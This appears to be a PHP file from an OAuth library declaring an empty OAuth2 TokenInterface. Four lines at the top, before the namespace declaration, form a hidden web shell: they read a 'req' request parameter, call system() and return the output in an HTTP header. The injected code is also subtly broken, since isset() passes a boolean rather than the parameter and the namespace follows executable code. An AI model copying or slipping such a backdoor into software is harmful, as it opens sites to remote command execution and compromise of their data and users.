<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

namespace OAuth\OAuth2\Token;

use OAuth\Common\Token\TokenInterface as BaseTokenInterface;

interface TokenInterface extends BaseTokenInterface
{
}
